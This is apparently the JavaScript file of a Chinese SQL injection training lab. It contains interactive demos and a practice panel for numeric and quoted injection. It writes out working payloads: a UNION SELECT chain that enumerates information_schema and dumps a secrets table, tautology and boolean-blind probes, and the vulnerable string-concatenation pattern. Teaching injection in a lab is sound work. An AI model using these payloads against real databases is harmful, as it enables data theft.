/**
 * HeaSec天积安全团队 - SQL注入基础靶场JavaScript文件
 * 版本: v1.0.0
 * 创建日期: 2026-04-01
 * 团队: 天积安全 (HeavenlySecret)
 */

// 全局配置
window.heasecConfig = window.heasecConfig || {
    commonBasePath: '../../../../common/',
    apiBasePath: './api/'
};

/**
 * 通用复制到剪贴板函数
 * @param {string} text - 要复制的文本
 * @param {Event} event - 点击事件（用于阻止冒泡）
 */
function copyToClipboard(text, event) {
    if (event) {
        event.stopPropagation();
    }

    navigator.clipboard.writeText(text).then(() => {
        // 显示复制成功提示
        showCopyToast('已复制到剪贴板');
    }).catch(err => {
        console.error('复制失败:', err);
        // 降级方案：使用传统复制方法
        const textarea = document.createElement('textarea');
        textarea.value = text;
        textarea.style.position = 'fixed';
        textarea.style.opacity = '0';
        document.body.appendChild(textarea);
        textarea.select();
        try {
            document.execCommand('copy');
            showCopyToast('已复制到剪贴板');
        } catch (e) {
            showCopyToast('复制失败，请手动复制', 'error');
        }
        document.body.removeChild(textarea);
    });
}

/**
 * 从按钮的data-payload属性读取并复制到剪贴板
 * @param {HTMLElement} button - 按钮元素
 * @param {Event} event - 点击事件
 */
function copyFromDataAttr(button, event) {
    const text = button.getAttribute('data-payload');
    if (text) {
        copyToClipboard(text, event);
    }
}

/**
 * 从元素的data-payload属性读取并填入输入框
 * @param {HTMLElement} element - 元素
 * @param {string} inputId - 目标输入框ID
 */
function usePayloadFromAttr(element, inputId) {
    const text = element.getAttribute('data-payload');
    if (text) {
        const input = document.getElementById(inputId);
        if (input) {
            input.value = text;
        }
    }
}

/**
 * 显示复制成功提示
 * @param {string} message - 提示信息
 * @param {string} type - 类型：success 或 error
 */
function showCopyToast(message, type = 'success') {
    // 移除已存在的toast
    const existingToast = document.querySelector('.copy-toast');
    if (existingToast) {
        existingToast.remove();
    }

    const toast = document.createElement('div');
    toast.className = 'copy-toast';
    toast.innerHTML = `<i class="fa fa-${type === 'success' ? 'check' : 'times'}"></i> ${message}`;
    document.body.appendChild(toast);

    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(-50%) translateY(20px)';
        setTimeout(() => {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }, 300);
    }, 2000);
}

/**
 * 可折叠区域切换函数
 * @param {string} sectionId - 区域ID
 */
function toggleSection(sectionId) {
    const section = document.getElementById(sectionId);
    if (!section) return;

    section.classList.toggle('expanded');
}

/**
 * SQL调试功能 - 区域1
 */
const SQLDebug = {
    /**
     * 执行SQL调试查询
     */
    executeQuery: function() {
        let keyword = document.getElementById('debugKeyword').value.trim();

        if (!keyword) {
            this.showMessage('请填写搜索内容', 'warning');
            return;
        }

        // 将--+替换为--空格，确保MySQL注释符正确生效
        // （因为encodeURIComponent会将+编码为%2B而不是空格）
        keyword = keyword.replace(/--\+/g, '-- ');

        // 显示加载状态
        const resultDiv = document.getElementById('debugResult');
        const debugInfoDiv = document.getElementById('debugInfo');
        resultDiv.innerHTML = '<div class="loading"><i class="fa fa-spinner fa-spin"></i> 查询中...</div>';
        debugInfoDiv.innerHTML = '';

        // 发送AJAX请求
        fetch(`api/debug-query.php?keyword=${encodeURIComponent(keyword)}`)
            .then(response => response.json())
            .then(data => {
                // 显示调试信息（传入用户输入以高亮显示）
                debugInfoDiv.innerHTML = this.formatDebugInfo(data, keyword);

                // 显示查询结果
                resultDiv.innerHTML = this.formatResult(data);
            })
            .catch(error => {
                resultDiv.innerHTML = `<div class="error-message"><i class="fa fa-exclamation-triangle"></i> 请求失败: ${error.message}</div>`;
            });
    },

    /**
     * 格式化调试信息，将用户输入部分以红字高亮显示
     * @param {Object} data - API返回的数据对象
     * @param {string} [userInput] - 用户输入的原始内容，用于高亮标识
     */
    formatDebugInfo: function(data, userInput) {
        if (!data.debug_info) return '';

        var debugHtml = this.escapeHtml(data.debug_info);

        // 如果有用户输入，在转义后的文本中查找并红字高亮
        if (userInput) {
            var escapedInput = this.escapeHtml(userInput);
            if (escapedInput && debugHtml.indexOf(escapedInput) !== -1) {
                debugHtml = debugHtml.split(escapedInput).join(
                    '<strong class="vf-text-danger">' + escapedInput + '</strong>'
                );
            }
        }

        return `
            <div class="debug-info-box">
                <h4><i class="fa fa-bug"></i> 调试信息</h4>
                <div class="debug-sql">${debugHtml}</div>
            </div>
        `;
    },

    /**
     * 格式化查询结果
     */
    formatResult: function(data) {
        if (!data.success) {
            return `
                <div class="warning-box">
                    <h5><i class="fa fa-exclamation-triangle"></i> 查询错误</h5>
                    <p>${this.escapeHtml(data.message)}</p>
                    ${data.error ? `<code>${this.escapeHtml(data.error)}</code>` : ''}
                </div>
            `;
        }

        if (!data.data || data.data.length === 0) {
            return `
                <div class="info-box">
                    <h5><i class="fa fa-info-circle"></i> 查询结果</h5>
                    <p>${this.escapeHtml(data.message)}</p>
                </div>
            `;
        }

        // 生成表格
        let html = `<div class="success-box"><h5><i class="fa fa-check-circle"></i> ${this.escapeHtml(data.message)}</h5></div>`;
        html += '<table class="result-table"><thead><tr>';

        // 表头
        const columns = Object.keys(data.data[0]);
        columns.forEach(col => {
            html += `<th>${this.escapeHtml(col)}</th>`;
        });
        html += '</tr></thead><tbody>';

        // 数据行
        data.data.forEach(row => {
            html += '<tr>';
            columns.forEach(col => {
                html += `<td>${this.escapeHtml(row[col])}</td>`;
            });
            html += '</tr>';
        });

        html += '</tbody></table>';
        return html;
    },

    /**
     * 复制Payload到输入框
     */
    copyPayload: function(payload) {
        document.getElementById('debugKeyword').value = payload;
        this.showMessage('已复制到输入框', 'success');
    },

    /**
     * 显示消息提示
     */
    showMessage: function(message, type) {
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type === 'success' ? 'success' : type === 'warning' ? 'warning' : 'danger'} heasec-alert`;
        alertDiv.style.cssText = 'position: fixed; top: 20px; right: 20px; z-index: 10000; max-width: 300px; padding: 15px 20px; border-radius: 8px;';
        alertDiv.innerHTML = `<i class="fa fa-${type === 'success' ? 'check-circle' : 'exclamation-circle'}"></i> ${message}`;
        document.body.appendChild(alertDiv);

        setTimeout(() => {
            if (alertDiv.parentNode) {
                alertDiv.parentNode.removeChild(alertDiv);
            }
        }, 3000);
    },

    /**
     * HTML转义
     */
    escapeHtml: function(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
};

/**
 * SQL注入练习功能 - 区域4
 */
const SQLPractice = {
    currentScenario: 'numeric',

    /**
     * 切换注入场景
     */
    switchScenario: function(scenario) {
        this.currentScenario = scenario;

        // 更新按钮状态
        document.querySelectorAll('.scenario-btn').forEach(btn => {
            btn.classList.remove('active');
        });
        document.querySelector(`[data-scenario="${scenario}"]`).classList.add('active');

        // 清空结果
        document.getElementById('practiceResult').innerHTML = '';
        document.getElementById('practiceDebugInfo').innerHTML = '';

        // 更新提示信息
        this.updateHint(scenario);
    },

    /**
     * 更新场景提示
     */
    updateHint: function(scenario) {
        const hints = {
            numeric: '当前场景：数字型注入。参数不需要引号闭合，直接输入数字或注入语句。',
            single_quote: '当前场景：字符型注入（单引号）。参数需要单引号闭合，尝试输入单引号观察错误。',
            double_quote: '当前场景：字符型注入（双引号）。参数需要双引号闭合，尝试输入双引号观察错误。'
        };

        const hintDiv = document.getElementById('scenarioHint');
        if (hintDiv) {
            hintDiv.innerHTML = `<i class="fa fa-lightbulb-o"></i> ${hints[scenario]}`;
        }

        // 同时更新数据提取流程
        this.updateExtractionSteps(scenario);
    },

    /**
     * 更新数据提取流程payload
     */
    updateExtractionSteps: function(scenario) {
        const stepsDiv = document.getElementById('extractionSteps');
        if (!stepsDiv) return;

        // 根据场景类型定义payload前缀
        const prefixes = {
            numeric: '1',
            single_quote: "'",
            double_quote: '"'
        };

        const prefix = prefixes[scenario] || '1';

        // Payload定义
        const payloads = [
            {
                step: '步骤1：获取数据库名',
                payload: `${prefix} UNION SELECT 1,database(),3,4 --+`
            },
            {
                step: '步骤2：获取表名',
                payload: `${prefix} UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() --+`
            },
            {
                step: '步骤3：获取列名',
                payload: `${prefix} UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='heasec_sqlbase_secrets' --+`
            },
            {
                step: '步骤4：获取数据',
                payload: `${prefix} UNION SELECT 1,secret_name,secret_value,4 FROM heasec_sqlbase_secrets --+`
            }
        ];

        // 生成步骤HTML
        let html = '';
        payloads.forEach(item => {
            const escapedPayload = this.escapeJs(item.payload);
            html += `
                <div class="info-box">
                    <h5><i class="fa fa-info-circle"></i> ${item.step}</h5>
                    <div class="code-row">
                        <code class="clickable-payload" onclick="SQLPractice.usePayload('${escapedPayload}')">${SQLDebug.escapeHtml(item.payload)}</code>
                        <button class="copy-btn" onclick="copyToClipboard('${escapedPayload}', event)" title="复制到剪贴板">
                            <i class="fa fa-copy"></i>
                        </button>
                    </div>
                </div>
            `;
        });

        stepsDiv.innerHTML = html;
    },

    /**
     * JavaScript字符串转义（用于双引号包裹的HTML属性）
     * 注意：双引号需要转义为HTML实体，因为onclick属性使用双引号包裹
     */
    escapeJs: function(str) {
        return str.replace(/\\/g, '\\\\')
                  .replace(/'/g, "\\'")
                  .replace(/"/g, '&quot;')
                  .replace(/\n/g, '\\n')
                  .replace(/\r/g, '\\r');
    },

    /**
     * 执行注入测试
     */
    executeTest: function() {
        let input = document.getElementById('practiceInput').value.trim();

        if (!input && input !== '0') {
            this.showMessage('请输入测试内容', 'warning');
            return;
        }

        // 将--+替换为--空格，确保MySQL注释符正确生效
        // （因为encodeURIComponent会将+编码为%2B而不是空格）
        input = input.replace(/--\+/g, '-- ');

        // 显示加载状态
        const resultDiv = document.getElementById('practiceResult');
        const debugInfoDiv = document.getElementById('practiceDebugInfo');
        resultDiv.innerHTML = '<div class="loading"><i class="fa fa-spinner fa-spin"></i> 查询中...</div>';

        // 发送AJAX请求
        fetch(`api/practice-query.php?scenario=${this.currentScenario}&input=${encodeURIComponent(input)}`)
            .then(response => response.json())
            .then(data => {
                // 显示调试信息（传入用户输入以高亮显示）
                debugInfoDiv.innerHTML = SQLDebug.formatDebugInfo(data, input);

                // 显示结果
                resultDiv.innerHTML = this.formatPracticeResult(data);
            })
            .catch(error => {
                resultDiv.innerHTML = `<div class="error-message"><i class="fa fa-exclamation-triangle"></i> 请求失败: ${error.message}</div>`;
            });
    },

    /**
     * 格式化练习结果
     */
    formatPracticeResult: function(data) {
        let html = `<div class="info-box">
            <h5><i class="fa fa-info-circle"></i> 场景: ${data.scenario_name}</h5>
        </div>`;

        if (!data.success) {
            html += `
                <div class="warning-box">
                    <h5><i class="fa fa-exclamation-triangle"></i> SQL语法错误</h5>
                    <p>这可能是一个有效的注入点！错误信息可以帮助你了解数据库结构。</p>
                    <code>${SQLDebug.escapeHtml(data.error)}</code>
                </div>
            `;
            return html;
        }

        if (!data.data || data.data.length === 0) {
            html += `
                <div class="info-box">
                    <h5><i class="fa fa-info-circle"></i> 查询成功</h5>
                    <p>${SQLDebug.escapeHtml(data.message)}</p>
                </div>
            `;
            return html;
        }

        // 生成表格
        html += `<div class="success-box"><h5><i class="fa fa-check-circle"></i> ${SQLDebug.escapeHtml(data.message)}</h5></div>`;
        html += '<table class="result-table"><thead><tr>';

        const columns = data.columns || Object.keys(data.data[0]);
        columns.forEach(col => {
            html += `<th>${SQLDebug.escapeHtml(col)}</th>`;
        });
        html += '</tr></thead><tbody>';

        data.data.forEach(row => {
            html += '<tr>';
            columns.forEach(col => {
                html += `<td>${SQLDebug.escapeHtml(row[col] || '')}</td>`;
            });
            html += '</tr>';
        });

        html += '</tbody></table>';
        return html;
    },

    /**
     * 使用预设Payload
     */
    usePayload: function(payload) {
        document.getElementById('practiceInput').value = payload;
    },

    /**
     * 显示消息
     */
    showMessage: SQLDebug.showMessage
};

/**
 * 学习完成功能 - 区域6
 */
function showMasteryCongrats() {
    if (typeof HeaSecCongratsModal !== 'undefined') {
        HeaSecCongratsModal.show({
            title: '🎉 恭喜你掌握了SQL注入基础！',
            message: '你已经理解了SQL注入的原理、类型和基本利用方法。这些知识是你学习WEB安全的重要基础！\n\n记住：学习漏洞的目的是为了更好地防御！',
            buttonText: '继续学习',
            showParticles: true,
            particleCount: 10,
            animationDuration: 2500,
            enableNextRangeButton: true,
            rangeCode: 'sqlbase',
            updateStatusApiUrl: heasecConfig.commonBasePath + 'api/update-learning-status.php',
            nextRangeApiUrl: heasecConfig.commonBasePath + 'api/next-range.php',
            onClose: function() {
                // 弹窗关闭
            },
            onContinue: function() {
                updateLearningStatus();
            }
        });
    } else {
        alert('🎉 恭喜你掌握了SQL注入基础！\n\n你已经理解了SQL注入的原理、类型和基本利用方法。\n\n系统正在记录你的学习状态...');
        updateLearningStatus();
    }
}

/**
 * 更新学习状态
 */
function updateLearningStatus() {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', heasecConfig.commonBasePath + 'api/update-learning-status.php', true);
    xhr.setRequestHeader('Content-Type', 'application/json');

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                try {
                    const response = JSON.parse(xhr.responseText);
                    if (response.success) {
                        showSuccessMessage('学习状态已更新为"已掌握"');

                        // 禁用掌握按钮
                        const masteryBtn = document.getElementById('sqlMasteryBtn');
                        if (masteryBtn) {
                            masteryBtn.disabled = true;
                            masteryBtn.innerHTML = '<i class="fa fa-check"></i> 已掌握';
                            masteryBtn.style.opacity = '0.7';
                            masteryBtn.style.cursor = 'not-allowed';
                        }
                    } else {
                        // 学习状态更新失败
                    }
                } catch (e) {
                    // 响应解析失败
                }
            }
        }
    };

    const data = JSON.stringify({
        code: 'sqlbase',
        status: '已掌握',
        timestamp: Date.now()
    });
    xhr.send(data);
}

/**
 * 显示成功消息
 */
function showSuccessMessage(message) {
    const alertDiv = document.createElement('div');
    alertDiv.className = 'alert alert-success heasec-alert';
    alertDiv.style.cssText = 'position: fixed; top: 20px; right: 20px; z-index: 10000; max-width: 300px; padding: 15px 20px; border-radius: 8px;';
    alertDiv.innerHTML = '<i class="fa fa-check-circle"></i> ' + message;
    document.body.appendChild(alertDiv);

    setTimeout(function() {
        if (alertDiv.parentNode) {
            alertDiv.parentNode.removeChild(alertDiv);
        }
    }, 3000);
}

/**
 * 切换流程图类型：显示对应的流程图，调用API获取数据，自动播放动画
 * @param {string} type - 'normal' | 'inject'
 */
function switchFlow(type) {
    var flowNormal = document.getElementById('flowNormal');
    var flowInject = document.getElementById('flowInject');
    var btnNormal = document.getElementById('btnNormal');
    var btnInject = document.getElementById('btnInject');
    var statusEl = document.getElementById('simStatus');

    // 切换按钮选中状态
    btnNormal.classList.toggle('active', type === 'normal');
    btnInject.classList.toggle('active', type === 'inject');

    // 切换流程图显示
    if (type === 'normal') {
        flowNormal.classList.remove('vf-hidden');
        flowInject.classList.add('vf-hidden');
    } else {
        flowInject.classList.remove('vf-hidden');
        flowNormal.classList.add('vf-hidden');
    }

    // 确定查询输入
    var input = (type === 'normal') ? '1' : '1 OR 1=1';

    // 更新模拟查询输入框
    var simInput = document.getElementById('simQueryInput');
    if (simInput) {
        simInput.value = input;
        // 根据类型添加视觉反馈
        simInput.classList.remove('vf-input-safe', 'vf-input-danger');
        simInput.classList.add(type === 'normal' ? 'vf-input-safe' : 'vf-input-danger');
    }

    statusEl.innerHTML = '<span class="vf-status-loading"><i class="fa fa-spinner fa-spin"></i> 正在查询...</span>';

    // 发送API请求
    var queryInput = input.replace(/--\+/g, '-- ');
    fetch('api/practice-query.php?scenario=numeric&input=' + encodeURIComponent(queryInput))
        .then(function(response) { return response.json(); })
        .then(function(data) {
            var rows = data.data || [];
            var count = rows.length;

            // 更新状态
            if (type === 'normal') {
                statusEl.innerHTML = '<span class="vf-status-safe"><i class="fa fa-check-circle"></i> 正常查询，返回 <strong>' + count + '</strong> 条数据</span>';
                updateNormalFlow(input, rows, count);
            } else {
                statusEl.innerHTML = '<span class="vf-status-danger"><i class="fa fa-exclamation-triangle"></i> 检测到SQL注入! 返回 <strong>' + count + '</strong> 条数据</span>';
                updateInjectFlow(input, data);
            }

            // 自动播放动画
            playFlowAnimation(type);
        })
        .catch(function(err) {
            statusEl.innerHTML = '<span class="vf-status-error"><i class="fa fa-exclamation-triangle"></i> 请求失败</span>';
        });
}

/**
 * 更新正常查询流程图的数据气泡
 * @param {string} input - 用户输入
 * @param {Array} rows - 查询结果数据
 * @param {number} count - 结果数量
 */
function updateNormalFlow(input, rows, count) {
    var safeInput = SQLDebug.escapeHtml(input);
    var encodedInput = encodeURIComponent(input).replace(/'/g, '&#39;');

    // 副标题
    document.getElementById('normalSubtitle').textContent = '用户输入: id = ' + input;

    // 绿色高亮包裹
    var hl = '<strong class="vf-text-safe">' + safeInput + '</strong>';

    // Step 1: HTTP请求
    document.getElementById('normalRequest').innerHTML =
        'GET /api/product.php?id=' + hl;

    // Step 2: SQL拼接
    document.getElementById('normalSql').innerHTML =
        'SELECT id, name, price, description<br>FROM heasec_sqlbase_products<br>WHERE id = ' + hl;

    // Step 2: 漏洞原因说明（正常查询）
    document.getElementById('normalCause').innerHTML =
        '<div class="vf-cause-title"><i class="fa fa-info-circle"></i> 为什么正常查询没有问题？</div>' +
        '<div class="vf-cause-body">用户输入 <code>' + hl + '</code> 是一个合法的数字，拼接后SQL语义没有改变。</div>' +
        '<div class="vf-cause-code"><span class="vf-cause-label">后端拼接方式：</span>' +
        '<code>$sql = "SELECT * FROM products WHERE id = " . $_GET[\'id\'];</code></div>' +
        '<div class="vf-cause-footer">虽然这次查询结果正确，但后端使用的是<strong>直接拼接</strong>，存在安全隐患。</div>';

    // Step 3: 数据库执行
    document.getElementById('normalDbLabel').textContent = '执行结果: 匹配 ' + count + ' 条记录';
    document.getElementById('normalDbCode').innerHTML =
        'MySQL: WHERE id = ' + hl + ' → 命中 ' + count + ' 行';

    // Step 4: 返回结果
    document.getElementById('normalResultLabel').textContent = '✅ 正常返回 ' + count + ' 条数据';
    var tbodyHtml = '';
    if (rows.length > 0) {
        rows.forEach(function(row) {
            tbodyHtml += '<tr><td>' + SQLDebug.escapeHtml(String(row.id)) +
                '</td><td>' + SQLDebug.escapeHtml(row.name) +
                '</td><td>$' + SQLDebug.escapeHtml(row.price) +
                '</td><td>' + SQLDebug.escapeHtml(row.description) + '</td></tr>';
        });
    } else {
        tbodyHtml = '<tr><td colspan="4" style="text-align:center;color:#a0aec0;">未查询到数据</td></tr>';
    }
    document.getElementById('normalResultBody').innerHTML = tbodyHtml;
}

/**
 * 更新注入查询流程图的数据气泡
 * @param {string} input - 用户输入
 * @param {Object} data - API返回的完整数据
 */
function updateInjectFlow(input, data) {
    var safeInput = SQLDebug.escapeHtml(input);
    var encodedInput = encodeURIComponent(input).replace(/'/g, '&#39;');

    // 副标题
    document.getElementById('injectSubtitle').textContent = '用户输入: id = ' + input;

    // 红色高亮包裹
    var hl = '<strong class="vf-text-danger">' + safeInput + '</strong>';

    // Step 1: HTTP请求（含恶意参数）- URL中空格用+编码，先替换值再包裹标签
    var urlInput = safeInput.replace(/ /g, '+');
    var hlUrl = '<strong class="vf-text-danger">' + urlInput + '</strong>';
    document.getElementById('injectRequest').innerHTML =
        'GET /api/product.php?id=' + hlUrl;

    // Step 2: SQL拼接（注入成功）- 在SQL中高亮注入部分
    var sqlDisplay = data.sql ? SQLDebug.escapeHtml(data.sql) : ('WHERE id = ' + safeInput);
    sqlDisplay = sqlDisplay.replace(/\n/g, '<br>');
    // 将输入值替换为红色高亮
    var safeInputForSql = SQLDebug.escapeHtml(input);
    if (sqlDisplay.indexOf(safeInputForSql) !== -1) {
        sqlDisplay = sqlDisplay.replace(safeInputForSql, '<strong class="vf-text-danger">' + safeInputForSql + '</strong>');
    }
    document.getElementById('injectSql').innerHTML = sqlDisplay;

    // Step 2: 漏洞原因说明（注入查询）
    document.getElementById('injectCause').innerHTML =
        '<div class="vf-cause-title"><i class="fa fa-exclamation-triangle"></i> 漏洞根本原因：用户输入被当作SQL代码执行</div>' +
        '<div class="vf-cause-body">用户输入 <code>' + hl + '</code> 包含SQL关键字，拼接后<strong>改变了SQL语句的语义</strong>。</div>' +
        '<div class="vf-cause-code"><span class="vf-cause-label vf-cause-label-danger">后端拼接方式：</span>' +
        '<code>$sql = "SELECT * FROM products WHERE id = " . $_GET[\'id\'];<br>// 用户输入 1 OR 1=1 后，WHERE条件永远为真！</code></div>';

    // Step 3: 数据库执行
    var rows = data.data || [];
    var count = rows.length;
    var dbLabel, dbCode;

    if (data.error) {
        dbLabel = '🚨 执行结果: SQL语法错误!';
        dbCode = 'MySQL: ' + SQLDebug.escapeHtml(data.error.substring(0, 100));
    } else if (count > 1) {
        dbLabel = '🚨 执行结果: 匹配全部 ' + count + ' 条记录!';
        dbCode = 'MySQL: WHERE id = ' + hl + ' → <strong>命中 ' + count + ' 行</strong>';
    } else {
        dbLabel = '⚠️ 执行结果: 匹配 ' + count + ' 条记录';
        dbCode = 'MySQL: 注入条件未生效，命中 ' + count + ' 行';
    }
    document.getElementById('injectDbLabel').innerHTML = dbLabel;
    document.getElementById('injectDbCode').innerHTML = dbCode;

    // Step 4: 返回结果
    var resultLabel, tbodyHtml;
    if (data.error) {
        resultLabel = '🔴 SQL错误（但攻击者可据此推断数据库结构）';
        tbodyHtml = '<tr><td colspan="4" style="text-align:center;color:#e53e3e;">SQL错误: ' + SQLDebug.escapeHtml(data.error.substring(0, 60)) + '</td></tr>';
    } else if (count > 1) {
        resultLabel = '🔴 全部 ' + count + ' 条数据泄露!';
        tbodyHtml = '';
        rows.forEach(function(row) {
            tbodyHtml += '<tr><td>' + SQLDebug.escapeHtml(String(row.id)) +
                '</td><td>' + SQLDebug.escapeHtml(row.name || '') +
                '</td><td>$' + SQLDebug.escapeHtml(row.price || '') +
                '</td><td>' + SQLDebug.escapeHtml(row.description || '') + '</td></tr>';
        });
    } else {
        resultLabel = '⚠️ 返回 ' + count + ' 条数据';
        tbodyHtml = '<tr><td colspan="4" style="text-align:center;color:#a0aec0;">注入条件未产生额外数据泄露</td></tr>';
    }
    document.getElementById('injectResultLabel').innerHTML = resultLabel;
    document.getElementById('injectResultBody').innerHTML = tbodyHtml;
}

/**
 * 播放动态流程图动画（逐步展示）
 * @param {string} type - 'normal' 正常查询 | 'inject' 注入查询
 */
function playFlowAnimation(type) {
    var container = document.getElementById(type === 'normal' ? 'flowNormal' : 'flowInject');
    if (!container) return;

    // 获取播放按钮
    var btn = container.querySelector('.vf-play-btn');
    if (btn && btn.classList.contains('playing')) return; // 防止重复点击

    // 获取所有步骤
    var steps = container.querySelectorAll('.vf-step');

    // 重置所有步骤状态
    steps.forEach(function(step) {
        step.classList.remove('active', 'done');
    });

    // 设置按钮为播放中状态
    if (btn) btn.classList.add('playing');

    // 逐步播放动画：每步间隔1秒
    var stepDelay = 1000;
    steps.forEach(function(step, index) {
        setTimeout(function() {
            // 将之前的步骤标记为完成
            if (index > 0) {
                steps[index - 1].classList.remove('active');
                steps[index - 1].classList.add('done');
            }
            // 激活当前步骤
            step.classList.add('active');

            // 最后一步完成后恢复按钮
            if (index === steps.length - 1) {
                setTimeout(function() {
                    if (btn) btn.classList.remove('playing');
                }, 2000);
            }
        }, (index + 1) * stepDelay);
    });
}

/**
 * 布尔盲注判断演示：测试 1 AND 1=1 / 1 AND 1=2 的不同响应
 * @param {string} input - 测试输入值
 */
function testBoolInject(input) {
    var btnTrue = document.getElementById('btnBoolTrue');
    var btnFalse = document.getElementById('btnBoolFalse');
    var resultBox = document.getElementById('boolResultBox');
    var resultBadge = document.getElementById('boolResultBadge');
    var resultSql = document.getElementById('boolResultSql');
    var resultBody = document.getElementById('boolResultBody');
    var resultFooter = document.getElementById('boolResultFooter');

    // 切换按钮状态
    var isTrue = (input === '1 AND 1=1');
    btnTrue.classList.toggle('active', isTrue);
    btnFalse.classList.toggle('active', !isTrue);

    // 显示结果区
    resultBox.classList.remove('vf-hidden');

    // 显示加载
    resultBadge.textContent = '';
    resultSql.textContent = '';
    resultBody.innerHTML = '<div class="loading"><i class="fa fa-spinner fa-spin"></i> 正在查询...</div>';
    resultFooter.textContent = '';

    // 调用API查询
    var queryInput = input.replace(/--\+/g, '-- ');
    fetch('api/practice-query.php?scenario=numeric&input=' + encodeURIComponent(queryInput))
        .then(function(response) { return response.json(); })
        .then(function(data) {
            var rows = data.data || [];
            var count = rows.length;
            var safeInput = SQLDebug.escapeHtml(input);

            // SQL语句展示（高亮注入部分）
            var sqlHtml = data.sql ? SQLDebug.escapeHtml(data.sql) : ('WHERE id = ' + safeInput);
            sqlHtml = sqlHtml.replace(/\n/g, '<br>');
            // 高亮用户输入部分
            var hlClass = 'vf-text-danger';
            var safeInputEscaped = SQLDebug.escapeHtml(input);
            if (sqlHtml.indexOf(safeInputEscaped) !== -1) {
                sqlHtml = sqlHtml.replace(safeInputEscaped, '<strong class="' + hlClass + '">' + safeInputEscaped + '</strong>');
            }
            resultSql.innerHTML = '<code>执行SQL: ' + sqlHtml + '</code>';

            if (isTrue) {
                // 1 AND 1=1 → 条件为真，模拟真实页面返回商品数据
                resultBadge.innerHTML = '<span class="vf-bool-badge-false"><i class="fa fa-check-circle"></i> AND 1=1 → 条件为真</span>';
                resultBox.className = 'vf-bool-result vf-bool-result-false';

                // 商品名到图片的映射
                var productImages = {
                    'Apple': 'images/apple.svg',
                    'Banana': 'images/banana.svg',
                    'Orange': 'images/orange.svg',
                    'Grape': 'images/grape.svg',
                    'Watermelon': 'images/watermelon.svg'
                };

                // 模拟浏览器窗口展示真实页面
                var pageHtml = '<div class="vf-mock-browser">';
                pageHtml += '<div class="vf-mock-browser-bar"><i class="fa fa-globe"></i> product.php?id=1+AND+1=1</div>';
                pageHtml += '<div class="vf-mock-browser-body">';
                if (rows.length > 0) {
                    rows.forEach(function(row) {
                        var imgSrc = productImages[row.name] || '';
                        var imgHtml = imgSrc
                            ? '<img src="' + imgSrc + '" alt="' + SQLDebug.escapeHtml(row.name) + '">'
                            : '<i class="fa fa-image"></i><span>' + SQLDebug.escapeHtml(row.name) + '</span>';
                        pageHtml += '<div class="vf-mock-product-card">';
                        pageHtml += '<div class="vf-mock-product-img">' + imgHtml + '</div>';
                        pageHtml += '<div class="vf-mock-product-info">';
                        pageHtml += '<div class="vf-mock-product-name">' + SQLDebug.escapeHtml(row.name) + '</div>';
                        pageHtml += '<div class="vf-mock-product-price">$' + SQLDebug.escapeHtml(row.price) + '</div>';
                        pageHtml += '<div class="vf-mock-product-desc">' + SQLDebug.escapeHtml(row.description) + '</div>';
                        pageHtml += '<div class="vf-mock-product-btn">加入购物车</div>';
                        pageHtml += '</div></div>';
                    });
                } else {
                    pageHtml += '<div class="vf-mock-empty-page"><i class="fa fa-inbox"></i><p>暂无商品信息</p></div>';
                }
                pageHtml += '</div></div>';
                resultBody.innerHTML = pageHtml;
                resultFooter.innerHTML = '<i class="fa fa-lightbulb-o"></i> 页面正常展示了 <strong>' + count + '</strong> 条商品数据 → 说明注入点存在，输入被当作SQL执行';
            } else {
                // 1 AND 1=2 → 条件为假，无数据
                resultBadge.innerHTML = '<span class="vf-bool-badge-false"><i class="fa fa-times-circle"></i> AND 1=2 → 条件为假</span>';
                resultBox.className = 'vf-bool-result vf-bool-result-false';

                // 模拟浏览器窗口展示空页面
                var emptyHtml = '<div class="vf-mock-browser">';
                emptyHtml += '<div class="vf-mock-browser-bar"><i class="fa fa-globe"></i> product.php?id=1+AND+1=2</div>';
                emptyHtml += '<div class="vf-mock-browser-body">';
                emptyHtml += '<div class="vf-mock-empty-page"><i class="fa fa-inbox"></i><p>暂无商品信息</p></div>';
                emptyHtml += '</div></div>';
                resultBody.innerHTML = emptyHtml;
                resultFooter.innerHTML = '<i class="fa fa-lightbulb-o"></i> 页面没有返回数据 → 与上面的查询结果<strong>不同</strong>，证实注入点存在';
            }
        })
        .catch(function(err) {
            resultBody.innerHTML = '<div class="error-message"><i class="fa fa-exclamation-triangle"></i> 请求失败</div>';
        });
}

/**
 * 字符型注入判断演示：测试 ' 和 '-- 的不同响应
 * @param {string} type - 'quote' 测试单引号 | 'comment' 测试注释符
 */
function testCharInject(type) {
    var btnQuote = document.getElementById('btnCharQuote');
    var btnComment = document.getElementById('btnCharComment');
    var resultBox = document.getElementById('charResultBox');
    var resultBadge = document.getElementById('charResultBadge');
    var resultSql = document.getElementById('charResultSql');
    var resultBody = document.getElementById('charResultBody');
    var resultFooter = document.getElementById('charResultFooter');

    // 确定输入值
    var input = (type === 'quote') ? "'" : "'-- ";
    var isQuote = (type === 'quote');

    // 切换按钮状态
    btnQuote.classList.toggle('active', isQuote);
    btnComment.classList.toggle('active', !isQuote);

    // 显示结果区
    resultBox.classList.remove('vf-hidden');

    // 显示加载
    resultBadge.textContent = '';
    resultSql.textContent = '';
    resultBody.innerHTML = '<div class="loading"><i class="fa fa-spinner fa-spin"></i> 正在查询...</div>';
    resultFooter.textContent = '';

    // 调用API查询（使用 single_quote 场景）
    var queryInput = input.replace(/--\+/g, '-- ');
    fetch('api/practice-query.php?scenario=single_quote&input=' + encodeURIComponent(queryInput))
        .then(function(response) { return response.json(); })
        .then(function(data) {
            var safeInput = SQLDebug.escapeHtml(input);

            // SQL语句展示（高亮注入部分）
            var sqlHtml = data.sql ? SQLDebug.escapeHtml(data.sql) : ('WHERE name = ' + safeInput);
            sqlHtml = sqlHtml.replace(/\n/g, '<br>');
            var hlClass = 'vf-text-danger';
            var safeInputEscaped = SQLDebug.escapeHtml(input);
            if (sqlHtml.indexOf(safeInputEscaped) !== -1) {
                sqlHtml = sqlHtml.replace(safeInputEscaped, '<strong class="' + hlClass + '">' + safeInputEscaped + '</strong>');
            }
